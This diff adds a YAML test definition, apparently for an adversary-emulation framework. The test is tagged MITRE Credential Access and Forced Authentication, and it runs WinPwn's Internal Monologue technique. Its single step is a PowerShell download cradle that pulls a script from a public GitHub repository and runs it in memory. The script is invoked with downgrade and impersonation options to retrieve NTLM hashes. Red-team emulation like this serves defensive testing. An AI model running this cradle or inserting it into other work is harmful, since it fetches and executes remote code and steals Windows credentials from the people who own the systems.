@@ -1,0 +1,21 @@
+api_version: "2.0"
+name: WinPwn - PowerSharpPack - Retrieving NTLM Hashes without Touching LSASS
+description: PowerSharpPack - Retrieving NTLM Hashes without Touching LSASS technique via function of WinPwn
+uuid: 7f06b25c-799e-40f1-89db-999c9cc84317
+mitre:
+    tactics:
+        - 'TA0006: Credential Access'
+    techniques:
+        - 'T1187: Forced Authentication'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: winpwn---powersharppack---retrieving-ntlm-hashes-without-touching-lsass
+      inline: |-
+        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Internalmonologue.ps1')
+        Invoke-Internalmonologue -command "-Downgrade true -impersonate true -restore true"
+      executor: powershell
+      cleanup:
+        inline: ""
+        executor: powershell
